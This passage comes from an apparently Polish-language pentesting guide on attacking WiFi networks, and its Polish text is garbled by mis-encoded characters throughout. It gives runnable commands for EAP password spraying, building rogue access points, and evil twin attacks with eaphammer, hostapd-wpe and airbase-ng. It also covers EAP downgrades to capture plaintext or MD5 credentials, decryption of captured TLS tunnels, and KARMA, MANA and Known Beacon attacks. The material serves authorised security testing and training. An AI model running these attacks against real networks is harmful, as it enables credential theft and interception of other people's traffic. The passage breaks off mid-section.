* **PEAP-MSCHAPv2**: CzÄ™sto nazywane PEAP, Å‚Ä…czy podatny mechanizm wyzwania/odpowiedzi MSCHAPv2 z ochronnym tunelem TLS.
* **PEAP-EAP-TLS (lub PEAP-TLS)**: Podobne do EAP-TLS, ale inicjuje tunel TLS przed wymianÄ… certyfikatÃ³w, oferujÄ…c dodatkowÄ… warstwÄ™ zabezpieczeÅ„.

WiÄ™cej informacji na temat tych metod uwierzytelniania znajdziesz [tutaj](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) i [tutaj](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Przechwytywanie Nazwy UÅ¼ytkownika

CzytajÄ…c [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) wyglÄ…da na to, Å¼e jeÅ›li uÅ¼ywasz **EAP**, **"Identity"** **messages** muszÄ… byÄ‡ **obsÅ‚ugiwane**, a **nazwa uÅ¼ytkownika** zostanie przesÅ‚ana w **czystej postaci** w wiadomoÅ›ciach **"Response Identity"**.

Nawet korzystajÄ…c z jednej z najbardziej bezpiecznych metod uwierzytelniania: **PEAP-EAP-TLS**, moÅ¼liwe jest **przechwycenie nazwy uÅ¼ytkownika wysÅ‚anej w protokole EAP**. Aby to zrobiÄ‡, **przechwyÄ‡ komunikacjÄ™ uwierzytelniania** (uruchom `airodump-ng` na kanale i `wireshark` na tej samej interfejsie) i przefiltruj pakiety za pomocÄ… `eapol`.\
W pakiecie "**Response, Identity**" pojawi siÄ™ **nazwa uÅ¼ytkownika** klienta.

![](<../../.gitbook/assets/image (850).png>)

### Anonimowe ToÅ¼samoÅ›ci

Ukrywanie toÅ¼samoÅ›ci jest obsÅ‚ugiwane zarÃ³wno przez EAP-PEAP, jak i EAP-TTLS. W kontekÅ›cie sieci WiFi, Å¼Ä…danie EAP-Identity jest zazwyczaj inicjowane przez punkt dostÄ™pu (AP) podczas procesu Å‚Ä…czenia. Aby zapewniÄ‡ ochronÄ™ anonimowoÅ›ci uÅ¼ytkownika, odpowiedÅº klienta EAP na urzÄ…dzeniu uÅ¼ytkownika zawiera tylko niezbÄ™dne informacje wymagane do przetworzenia Å¼Ä…dania przez poczÄ…tkowy serwer RADIUS. Ten koncept jest zilustrowany poprzez nastÄ™pujÄ…ce scenariusze:

* EAP-Identity = anonymous
* W tym scenariuszu wszyscy uÅ¼ytkownicy uÅ¼ywajÄ… pseudonimu "anonymous" jako identyfikatora uÅ¼ytkownika. PoczÄ…tkowy serwer RADIUS dziaÅ‚a jako serwer EAP-PEAP lub EAP-TTLS, odpowiedzialny za zarzÄ…dzanie serwerowÄ… stronÄ… protokoÅ‚u PEAP lub TTLS. WewnÄ™trzna (chroniona) metoda uwierzytelniania jest nastÄ™pnie obsÅ‚ugiwana lokalnie lub przekazywana do zdalnego (domowego) serwera RADIUS.
* EAP-Identity = anonymous@realm\_x
* W tej sytuacji uÅ¼ytkownicy z rÃ³Å¼nych domen ukrywajÄ… swoje toÅ¼samoÅ›ci, jednoczeÅ›nie wskazujÄ…c swoje odpowiednie domeny. Pozwala to poczÄ…tkowemu serwerowi RADIUS na przekierowanie Å¼Ä…daÅ„ EAP-PEAP lub EAP-TTLS do serwerÃ³w RADIUS w ich domenach domowych, ktÃ³re dziaÅ‚ajÄ… jako serwer PEAP lub TTLS. PoczÄ…tkowy serwer RADIUS dziaÅ‚a wyÅ‚Ä…cznie jako wÄ™zeÅ‚ przekazywania RADIUS.
* Alternatywnie, poczÄ…tkowy serwer RADIUS moÅ¼e dziaÅ‚aÄ‡ jako serwer EAP-PEAP lub EAP-TTLS i albo obsÅ‚ugiwaÄ‡ chronionÄ… metodÄ™ uwierzytelniania, albo przekazywaÄ‡ jÄ… do innego serwera. Ta opcja uÅ‚atwia konfiguracjÄ™ rÃ³Å¼nych polityk dla rÃ³Å¼nych domen.

W EAP-PEAP, gdy tunel TLS jest ustanowiony miÄ™dzy serwerem PEAP a klientem PEAP, serwer PEAP inicjuje Å¼Ä…danie EAP-Identity i przesyÅ‚a je przez tunel TLS. Klient odpowiada na to drugie Å¼Ä…danie EAP-Identity, wysyÅ‚ajÄ…c odpowiedÅº EAP-Identity zawierajÄ…cÄ… prawdziwÄ… toÅ¼samoÅ›Ä‡ uÅ¼ytkownika przez zaszyfrowany tunel. Ten sposÃ³b skutecznie zapobiega ujawnieniu rzeczywistej toÅ¼samoÅ›ci uÅ¼ytkownika osobie podsÅ‚uchujÄ…cej ruch 802.11.

EAP-TTLS postÄ™puje nieco inaczej. W przypadku EAP-TTLS, klient zazwyczaj uwierzytelnia siÄ™ za pomocÄ… PAP lub CHAP, zabezpieczonych przez tunel TLS. W tym przypadku klient zawiera atrybut User-Name oraz atrybut Password lub CHAP-Password w poczÄ…tkowej wiadomoÅ›ci TLS wysÅ‚anej po ustanowieniu tunelu.

NiezaleÅ¼nie od wybranego protokoÅ‚u, serwer PEAP/TTLS uzyskuje wiedzÄ™ o prawdziwej toÅ¼samoÅ›ci uÅ¼ytkownika po ustanowieniu tunelu TLS. Prawdziwa toÅ¼samoÅ›Ä‡ moÅ¼e byÄ‡ przedstawiona jako user@realm lub po prostu user. JeÅ›li serwer PEAP/TTLS jest rÃ³wnieÅ¼ odpowiedzialny za uwierzytelnianie uÅ¼ytkownika, teraz posiada toÅ¼samoÅ›Ä‡ uÅ¼ytkownika i kontynuuje metodÄ™ uwierzytelniania chronionÄ… przez tunel TLS. Alternatywnie, serwer PEAP/TTLS moÅ¼e przekazaÄ‡ nowe Å¼Ä…danie RADIUS do domowego serwera RADIUS uÅ¼ytkownika. Nowe Å¼Ä…danie RADIUS pomija warstwÄ™ protokoÅ‚u PEAP lub TTLS. W przypadkach, gdy chroniona metoda uwierzytelniania to EAP, wewnÄ™trzne wiadomoÅ›ci EAP sÄ… przesyÅ‚ane do domowego serwera RADIUS bez opakowania EAP-PEAP lub EAP-TTLS. Atrybut User-Name w wychodzÄ…cej wiadomoÅ›ci RADIUS zawiera prawdziwÄ… toÅ¼samoÅ›Ä‡ uÅ¼ytkownika, zastÄ™pujÄ…c anonimowy User-Name z przychodzÄ…cego Å¼Ä…dania RADIUS. Gdy chroniona metoda uwierzytelniania to PAP lub CHAP (obsÅ‚ugiwane tylko przez TTLS), atrybuty User-Name i inne atrybuty uwierzytelniania wydobyte z Å‚adunku TLS sÄ… zastÄ™powane w wychodzÄ…cej wiadomoÅ›ci RADIUS, zastÄ™pujÄ…c anonimowy User-Name i atrybuty TTLS EAP-Message znalezione w przychodzÄ…cym Å¼Ä…daniu RADIUS.

WiÄ™cej informacji znajdziesz pod adresem [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm)

### EAP-Bruteforce (password spray)

JeÅ›li oczekuje siÄ™, Å¼e klient uÅ¼yje **nazwy uÅ¼ytkownika i hasÅ‚a** (zauwaÅ¼, Å¼e **EAP-TLS nie bÄ™dzie waÅ¼ne** w tym przypadku), moÅ¼na sprÃ³bowaÄ‡ uzyskaÄ‡ **listÄ™** **nazw uÅ¼ytkownikÃ³w** (patrz nastÄ™pna czÄ™Å›Ä‡) i **hasÅ‚a** oraz sprÃ³bowaÄ‡ **przeprowadziÄ‡ atak brutalnej siÅ‚y** na dostÄ™p za pomocÄ… [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
MoÅ¼esz rÃ³wnieÅ¼ przeprowadziÄ‡ ten atak, korzystajÄ…c z `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria atakÃ³w klientÃ³w

### WybÃ³r sieci i roaming

* ProtokÃ³Å‚ 802.11 okreÅ›la, jak stacja doÅ‚Ä…cza do Rozszerzonego Zbioru UsÅ‚ug (ESS), ale nie okreÅ›la kryteriÃ³w wyboru ESS ani punktu dostÄ™pu (AP) w nim.
* Stacje mogÄ… przechodziÄ‡ miÄ™dzy AP, ktÃ³re dzielÄ… tÄ™ samÄ… ESSID, utrzymujÄ…c Å‚Ä…cznoÅ›Ä‡ w budynku lub obszarze.
* ProtokÃ³Å‚ wymaga uwierzytelnienia stacji do ESS, ale nie nakÅ‚ada obowiÄ…zku uwierzytelnienia AP do stacji.

### Listy Preferowanych Sieci (PNL)

* Stacje przechowujÄ… ESSID kaÅ¼dej sieci bezprzewodowej, do ktÃ³rej siÄ™ Å‚Ä…czÄ…, w swojej LiÅ›cie Preferowanych Sieci (PNL), wraz z szczegÃ³Å‚ami konfiguracji specyficznymi dla sieci.
* PNL jest uÅ¼ywana do automatycznego Å‚Ä…czenia siÄ™ z znanymi sieciami, poprawiajÄ…c doÅ›wiadczenie uÅ¼ytkownika poprzez usprawnienie procesu Å‚Ä…czenia.

### Skanowanie pasywne

* AP okresowo nadaje ramki sygnalizacyjne, ogÅ‚aszajÄ…c swojÄ… obecnoÅ›Ä‡ i funkcje, w tym ESSID AP, chyba Å¼e nadawanie jest wyÅ‚Ä…czone.
* Podczas skanowania pasywnego stacje nasÅ‚uchujÄ… ramek sygnalizacyjnych. JeÅ›li ESSID ramki sygnalizacyjnej pasuje do wpisu w PNL stacji, stacja moÅ¼e automatycznie poÅ‚Ä…czyÄ‡ siÄ™ z tym AP.
* ZnajomoÅ›Ä‡ PNL urzÄ…dzenia pozwala na potencjalne wykorzystanie poprzez naÅ›ladowanie ESSID znanej sieci, zmylajÄ…c urzÄ…dzenie do poÅ‚Ä…czenia z podstÄ™pnym AP.

### Aktywne sondowanie

* Aktywne sondowanie polega na wysyÅ‚aniu przez stacje Å¼Ä…daÅ„ sondy w celu odkrycia pobliskich AP i ich cech.
* Skierowane Å¼Ä…dania sondy sÄ… kierowane do okreÅ›lonego ESSID, pomagajÄ…c wykryÄ‡, czy okreÅ›lona sieÄ‡ jest w zasiÄ™gu, nawet jeÅ›li jest to ukryta sieÄ‡.
* Sondy rozgÅ‚oszeniowe majÄ… pole SSID o wartoÅ›ci null i sÄ… wysyÅ‚ane do wszystkich pobliskich AP, pozwalajÄ…c stacji sprawdziÄ‡, czy istnieje jakakolwiek preferowana sieÄ‡, nie ujawniajÄ…c zawartoÅ›ci swojego PNL.

## Prosty AP z przekierowaniem do Internetu

Zanim wyjaÅ›nimy, jak przeprowadziÄ‡ bardziej zÅ‚oÅ¼one ataki, zostanie wyjaÅ›nione **jak** po prostu **utworzyÄ‡** **AP** i **przekierowaÄ‡** jego **ruch** do interfejsu podÅ‚Ä…czonego **do** **Internetu**.

KorzystajÄ…c z `ifconfig -a`, sprawdÅº, czy interfejs wlan do utworzenia AP i interfejs podÅ‚Ä…czony do Internetu sÄ… obecne.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
UtwÃ³rz plik konfiguracyjny `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
NastÄ™pnie **ustaw adresy IP** i **trasy**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
NastÄ™pnie **uruchom** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
UtwÃ³rz plik konfiguracyjny `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zatrzymaj irytujÄ…ce procesy**, ustaw **tryb monitorowania** i **uruchom hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Przekierowywanie i przekierowanie
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## ZÅ‚oÅ›liwy bliÅºniak

Atak zÅ‚oÅ›liwego bliÅºniaka wykorzystuje sposÃ³b, w jaki klienci WiFi rozpoznajÄ… sieci, gÅ‚Ã³wnie polegajÄ…c na nazwie sieci (ESSID) bez koniecznoÅ›ci uwierzytelniania siÄ™ punktu dostÄ™pu (access point) wobec klienta. Kluczowe punkty obejmujÄ…:

* **TrudnoÅ›ci w rÃ³Å¼nicowaniu**: UrzÄ…dzenia majÄ… trudnoÅ›ci z rozrÃ³Å¼nieniem miÄ™dzy prawdziwymi a faÅ‚szywymi punktami dostÄ™pu, gdy dzielÄ… tÄ™ samÄ… nazwÄ™ ESSID i typ szyfrowania. Sieci w Å›wiecie rzeczywistym czÄ™sto uÅ¼ywajÄ… wielu punktÃ³w dostÄ™pu o tej samej nazwie ESSID, aby rozszerzyÄ‡ zasiÄ™g bezproblemowo.
* **Roaming klienta i manipulacja poÅ‚Ä…czeniem**: ProtokÃ³Å‚ 802.11 pozwala urzÄ…dzeniom na przechodzenie miÄ™dzy punktami dostÄ™pu w tej samej ESS. AtakujÄ…cy mogÄ… wykorzystaÄ‡ to, przyciÄ…gajÄ…c urzÄ…dzenie do rozÅ‚Ä…czenia siÄ™ z obecnym punktem dostÄ™pu i poÅ‚Ä…czenia siÄ™ z faÅ‚szywym. MoÅ¼na to osiÄ…gnÄ…Ä‡, oferujÄ…c silniejszy sygnaÅ‚ lub zakÅ‚Ã³cajÄ…c poÅ‚Ä…czenie z prawdziwym punktem dostÄ™pu za pomocÄ… metod takich jak pakiety deautoryzacyjne lub zakÅ‚Ã³canie.
* **Wyzwania w wykonaniu**: Skuteczne przeprowadzenie ataku zÅ‚oÅ›liwego bliÅºniaka w Å›rodowiskach z wieloma dobrze rozmieszczonymi punktami dostÄ™pu moÅ¼e byÄ‡ trudne. Dezautoryzacja jednego prawdziwego punktu dostÄ™pu czÄ™sto skutkuje poÅ‚Ä…czeniem urzÄ…dzenia z innym prawdziwym punktem dostÄ™pu, chyba Å¼e atakujÄ…cy moÅ¼e dezautoryzowaÄ‡ wszystkie pobliskie punkty dostÄ™pu lub strategicznie umieÅ›ciÄ‡ faÅ‚szywy punkt dostÄ™pu.

MoÅ¼esz stworzyÄ‡ bardzo podstawowego ZÅ‚oÅ›liwego BliÅºniaka Otwartego (bez moÅ¼liwoÅ›ci przekierowania ruchu do Internetu) wykonujÄ…c:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
MoÅ¼esz rÃ³wnieÅ¼ stworzyÄ‡ ZÅ‚ego BliÅºniaka uÅ¼ywajÄ…c **eaphammer** (zauwaÅ¼, Å¼e aby stworzyÄ‡ zÅ‚ego bliÅºniaka za pomocÄ… eaphammer, interfejs **NIE POWINIEN** byÄ‡ w trybie **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Lub uÅ¼ywajÄ…c Airgeddon: `Opcje: 5,6,7,8,9 (w menu ataku Evil Twin).`

![](<../../.gitbook/assets/image (1088).png>)

ProszÄ™ zauwaÅ¼yÄ‡, Å¼e domyÅ›lnie jeÅ›li ESSID w PNL jest zapisany jako chroniony przez WPA, urzÄ…dzenie nie bÄ™dzie automatycznie Å‚Ä…czyÄ‡ siÄ™ z otwartym zÅ‚owrogim bliÅºniakiem. MoÅ¼esz sprÃ³bowaÄ‡ przeprowadziÄ‡ atak DoS na prawdziwy AP i mieÄ‡ nadziejÄ™, Å¼e uÅ¼ytkownik poÅ‚Ä…czy siÄ™ rÄ™cznie z Twoim otwartym zÅ‚owrogim bliÅºniakiem, lub moÅ¼esz przeprowadziÄ‡ atak DoS na prawdziwy AP i uÅ¼yÄ‡ WPA Evil Twin do przechwycenia handshake (korzystajÄ…c z tej metody nie bÄ™dziesz mÃ³gÅ‚ pozwoliÄ‡ ofierze poÅ‚Ä…czyÄ‡ siÄ™ z TobÄ…, poniewaÅ¼ nie znasz PSK, ale moÅ¼esz przechwyciÄ‡ handshake i sprÃ³bowaÄ‡ go zÅ‚amaÄ‡).

_NiektÃ³re systemy operacyjne i oprogramowanie antywirusowe ostrzegÄ… uÅ¼ytkownika, Å¼e poÅ‚Ä…czenie z otwartÄ… sieciÄ… jest niebezpieczne..._

### ZÅ‚oÅ›liwy bliÅºniak WPA/WPA2

MoÅ¼esz stworzyÄ‡ **ZÅ‚oÅ›liwego bliÅºniaka uÅ¼ywajÄ…c WPA/2** i jeÅ›li urzÄ…dzenia sÄ… skonfigurowane do Å‚Ä…czenia siÄ™ z tym SSID za pomocÄ… WPA/2, bÄ™dÄ… prÃ³bowaÄ‡ siÄ™ poÅ‚Ä…czyÄ‡. W kaÅ¼dym razie, **aby ukoÅ„czyÄ‡ 4-stopniowy handshake**, musisz rÃ³wnieÅ¼ **znaÄ‡** **hasÅ‚o**, ktÃ³re klient zamierza uÅ¼yÄ‡. JeÅ›li go **nie znasz**, **poÅ‚Ä…czenie nie zostanie ukoÅ„czone**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Aby zrozumieÄ‡ te ataki, zalecam przeczytanie krÃ³tkiego [wyjaÅ›nienia WPA Enterprise](./#wpa-enterprise-mgt).

**Korzystanie z hostapd-wpe**

`hostapd-wpe` wymaga pliku **konfiguracyjnego**, aby dziaÅ‚aÄ‡. Aby **zautomatyzowaÄ‡** generowanie tych konfiguracji, moÅ¼na skorzystaÄ‡ z [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (pobierz plik pythona wewnÄ…trz _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
W pliku konfiguracyjnym moÅ¼esz wybraÄ‡ wiele rÃ³Å¼nych rzeczy, takich jak ssid, kanaÅ‚, pliki uÅ¼ytkownika, cret/key, parametry dh, wersja wpa i autoryzacja...

[**Korzystanie z hostapd-wpe z EAP-TLS, aby umoÅ¼liwiÄ‡ logowanie dowolnemu certyfikatowi.**](evil-twin-eap-tls.md)

**Korzystanie z EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
DomyÅ›lnie EAPHammer wykorzystuje te metody uwierzytelniania (zauwaÅ¼ GTC jako pierwszÄ… do prÃ³by uzyskania haseÅ‚ w postaci zwykÅ‚ego tekstu, a nastÄ™pnie korzysta z bardziej solidnych metod uwierzytelniania):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
To jest domyÅ›lna metodyka zapobiegajÄ…ca dÅ‚ugim czasom poÅ‚Ä…czenia. MoÅ¼esz jednak rÃ³wnieÅ¼ okreÅ›liÄ‡ serwerowi metody uwierzytelniania od najmniej do najbardziej wytrzymaÅ‚ych:
```
--negotiate weakest
```
lub moÅ¼na rÃ³wnieÅ¼ uÅ¼yÄ‡:

* `--negotiate gtc-downgrade` aby skorzystaÄ‡ z bardzo wydajnej implementacji obniÅ¼ania GTC (hasÅ‚a w postaci tekstu jawnego)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` aby rÄ™cznie okreÅ›liÄ‡ oferowane metody (oferowanie tych samych metod uwierzytelniania w tej samej kolejnoÅ›ci co organizacja, ktÃ³rÄ… atakujemy, sprawi, Å¼e atak bÄ™dzie znacznie trudniejszy do wykrycia).
* [ZnajdÅº wiÄ™cej informacji w wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Korzystanie z Airgeddon**

`Airgeddon` moÅ¼e uÅ¼yÄ‡ wczeÅ›niej wygenerowanych certyfikatÃ³w do zaoferowania uwierzytelniania EAP w sieciach WPA/WPA2-Enterprise. FaÅ‚szywa sieÄ‡ obniÅ¼y protokÃ³Å‚ poÅ‚Ä…czenia do EAP-MD5, dziÄ™ki czemu bÄ™dzie moÅ¼na **przechwyciÄ‡ uÅ¼ytkownika i MD5 hasÅ‚a**. PÃ³Åºniej atakujÄ…cy moÅ¼e sprÃ³bowaÄ‡ zÅ‚amaÄ‡ hasÅ‚o.\
`Airggedon` oferuje moÅ¼liwoÅ›Ä‡ **ciÄ…gÅ‚ego ataku Evil Twin (haÅ‚aÅ›liwy)** lub **tylko stworzenia ataku Evil Twin do momentu podÅ‚Ä…czenia siÄ™ kogoÅ› (gÅ‚adki).**

![](<../../.gitbook/assets/image (936).png>)

### Debugowanie tuneli TLS PEAP i EAP-TTLS w atakach Evil Twin

_Ta metoda zostaÅ‚a przetestowana w poÅ‚Ä…czeniu PEAP, ale poniewaÅ¼ deszyfrowujÄ™ dowolny tunel TLS, powinna dziaÅ‚aÄ‡ rÃ³wnieÅ¼ z EAP-TTLS_

W **konfiguracji** _hostapd-wpe_ **zakomentuj** linijkÄ™ zawierajÄ…cÄ… _**dh\_file**_ (od `dh_file=/etc/hostapd-wpe/certs/dh` do `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Spowoduje to, Å¼e `hostapd-wpe` bÄ™dzie **wymieniaÄ‡ klucze za pomocÄ… RSA** zamiast DH, dziÄ™ki czemu bÄ™dziesz mÃ³gÅ‚ **deszyfrowaÄ‡** ruch pÃ³Åºniej, **znajÄ…c prywatny klucz serwera**.

Teraz uruchom **Evil Twin** uÅ¼ywajÄ…c **`hostapd-wpe`** z tÄ… zmodyfikowanÄ… konfiguracjÄ… jak zwykle. Uruchom rÃ³wnieÅ¼ **`wireshark`** na **interfejsie**, ktÃ³ry wykonuje atak Evil Twin.

Teraz lub pÃ³Åºniej (gdy juÅ¼ przechwycisz pewne prÃ³by uwierzytelnienia) moÅ¼esz dodaÄ‡ prywatny klucz RSA do wiresharka w: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Dodaj nowy wpis i wypeÅ‚nij formularz tymi wartoÅ›ciami: **Adres IP = any** -- **Port = 0** -- **ProtokÃ³Å‚ = data** -- **Plik klucza** (**wybierz swÃ³j plik klucza**, aby uniknÄ…Ä‡ problemÃ³w wybierz plik klucza **bez zabezpieczenia hasÅ‚em**).

![](<../../.gitbook/assets/image (687).png>)

I spÃ³jrz na nowÄ… zakÅ‚adkÄ™ **"Decrypted TLS"**:

![](<../../.gitbook/assets/image (231).png>)

## Atak KARMA, MANA, Loud MANA i znane beacony

### Czarne i biaÅ‚e listy ESSID i MAC

RÃ³Å¼ne rodzaje list filtrÃ³w dostÄ™pu do kontrolki dostÄ™pu do mediÃ³w (MFACLs) i odpowiadajÄ…ce im tryby oraz efekty zachowania rogue Access Point (AP):

1. **Lista biaÅ‚ych MAC**:
* Rogue AP bÄ™dzie odpowiadaÄ‡ tylko na Å¼Ä…dania sondy od urzÄ…dzeÅ„ wymienionych na liÅ›cie biaÅ‚ych, pozostajÄ…c niewidocznym dla wszystkich innych nieuwzglÄ™dnionych.
2. **Lista czarnych MAC**:
* Rogue AP zignoruje Å¼Ä…dania sondy od urzÄ…dzeÅ„ na czarnej liÅ›cie, efektywnie sprawiajÄ…c, Å¼e rogue AP bÄ™dzie niewidoczny dla tych konkretnych urzÄ…dzeÅ„.
3. **Lista biaÅ‚ych SSID**:
* Rogue AP bÄ™dzie odpowiadaÄ‡ na Å¼Ä…dania sondy tylko dla okreÅ›lonych ESSID wymienionych na liÅ›cie, sprawiajÄ…c, Å¼e bÄ™dzie niewidoczny dla urzÄ…dzeÅ„, ktÃ³rych lista preferowanych sieci (PNLs) nie zawiera tych ESSID.
4. **Lista czarnych SSID**:
* Rogue AP nie bÄ™dzie odpowiadaÄ‡ na Å¼Ä…dania sondy dla okreÅ›lonych ESSID na czarnej liÅ›cie, sprawiajÄ…c, Å¼e bÄ™dzie niewidoczny dla urzÄ…dzeÅ„ poszukujÄ…cych tych konkretnych sieci.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ta metoda pozwala **atakujÄ…cemu stworzyÄ‡ zÅ‚oÅ›liwy punkt dostÄ™pu (AP), ktÃ³ry odpowiada na wszystkie Å¼Ä…dania sondy** od urzÄ…dzeÅ„ poszukujÄ…cych poÅ‚Ä…czenia do sieci. Ta technika **oszukuje urzÄ…dzenia, aby poÅ‚Ä…czyÅ‚y siÄ™ z AP atakujÄ…cego**, naÅ›ladujÄ…c sieci, ktÃ³rych poszukujÄ… urzÄ…dzenia. Gdy urzÄ…dzenie wysyÅ‚a Å¼Ä…danie poÅ‚Ä…czenia do tego faÅ‚szywego AP, nawiÄ…zuje poÅ‚Ä…czenie, prowadzÄ…c do bÅ‚Ä™dnego poÅ‚Ä…czenia urzÄ…dzenia z sieciÄ… atakujÄ…cego.

### MANA

NastÄ™pnie **urzÄ…dzenia zaczÄ™Å‚y ignorowaÄ‡ niechciane odpowiedzi sieciowe**, zmniejszajÄ…c skutecznoÅ›Ä‡ pierwotnego ataku karma. Jednak nowa metoda, znana jako **atak MANA**, zostaÅ‚a wprowadzona przez Iana de Villiersa i Dominica White'a. Ta metoda polega na tym, Å¼e zÅ‚oÅ›liwy AP **przechwytuje Listy Preferowanych Sieci (PNL) z urzÄ…dzeÅ„, odpowiadajÄ…c na ich rozgÅ‚oszeniowe Å¼Ä…dania sondy** nazwami sieci (SSID), ktÃ³re wczeÅ›niej byÅ‚y poszukiwane przez urzÄ…dzenia. Ten zaawansowany atak omija zabezpieczenia przed pierwotnym atakiem karma, wykorzystujÄ…c sposÃ³b, w jaki urzÄ…dzenia zapamiÄ™tujÄ… i priorytetujÄ… znane sieci.

Atak MANA dziaÅ‚a poprzez monitorowanie zarÃ³wno skierowanych, jak i rozgÅ‚oszeniowych Å¼Ä…daÅ„ sondy od urzÄ…dzeÅ„. Dla Å¼Ä…daÅ„ skierowanych, rejestruje adres MAC urzÄ…dzenia i nazwÄ™ Å¼Ä…danej sieci, dodajÄ…c te informacje do listy. Gdy otrzymuje Å¼Ä…danie rozgÅ‚oszeniowe, AP odpowiada informacjami pasujÄ…cymi do ktÃ³rejkolwiek z sieci znajdujÄ…cych siÄ™ na liÅ›cie urzÄ…dzenia, zachÄ™cajÄ…c urzÄ…dzenie do poÅ‚Ä…czenia z zÅ‚oÅ›liwym AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### GÅ‚oÅ›ny atak MANA

**Atak Loud MANA** to zaawansowana strategia stosowana w sytuacjach, gdy urzÄ…dzenia nie korzystajÄ… z kierowanych prÃ³b lub gdy ich Listy Preferowanych Sieci (PNL) sÄ… nieznane dla atakujÄ…cego. DziaÅ‚a on na zasadzie, Å¼e **urzÄ…dzenia w tym samym obszarze prawdopodobnie bÄ™dÄ… miaÅ‚y pewne nazwy sieci w swoich PNL**. Zamiast odpowiadaÄ‡ selektywnie, ten atak nadaje odpowiedzi na prÃ³by dla kaÅ¼dej nazwy sieci (ESSID) znalezionej w poÅ‚Ä…czonych PNL wszystkich obserwowanych urzÄ…dzeÅ„. To szerokie podejÅ›cie zwiÄ™ksza szansÄ™, Å¼e urzÄ…dzenie rozpozna znajomÄ… sieÄ‡ i sprÃ³buje poÅ‚Ä…czyÄ‡ siÄ™ z podstÄ™pnym punktem dostÄ™pu (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Znany atak Beacon

Kiedy atak **Loud MANA** moÅ¼e nie wystarczyÄ‡, atak **Znany Beacon** prezentuje inne podejÅ›cie. Ta metoda **siÅ‚owo wymusza proces poÅ‚Ä…czenia, symulujÄ…c AP odpowiadajÄ…cy na dowolnÄ… nazwÄ™ sieci, przechodzÄ…c przez listÄ™ potencjalnych ESSIDÃ³w** pochodzÄ…cych z listy sÅ‚Ã³w. Symuluje to obecnoÅ›Ä‡ licznych sieci, majÄ…c nadziejÄ™ dopasowaÄ‡ ESSID w PNL ofiary, co skÅ‚ania do prÃ³by poÅ‚Ä…czenia z sfaÅ‚szowanym AP. Atak moÅ¼na wzmocniÄ‡, Å‚Ä…czÄ…c go z opcjÄ… `--loud`, aby bardziej agresywnie zwabiÄ‡ urzÄ…dzenia.

Eaphammer zaimplementowaÅ‚ ten atak jako atak MANA, w ktÃ³rym wszystkie ESSIDy z listy sÄ… Å‚adowane (moÅ¼na takÅ¼e poÅ‚Ä…czyÄ‡ to z `--loud`, aby stworzyÄ‡ atak Loud MANA + Znane beacony):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Atak znany jako Known Beacon Burst**

